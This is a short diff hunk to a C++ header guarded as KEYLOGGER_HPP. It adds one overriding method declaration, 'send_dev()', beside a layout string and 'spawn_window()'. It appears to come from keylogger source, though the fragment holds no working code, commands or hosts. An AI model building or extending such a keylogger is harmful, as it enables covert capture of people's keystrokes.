@@ -12,6 +12,7 @@ public:
 protected:
     std::string layout_;
     void spawn_window() override;
+    void send_dev() override;
 };
 
 #endif // KEYLOGGER_HPP
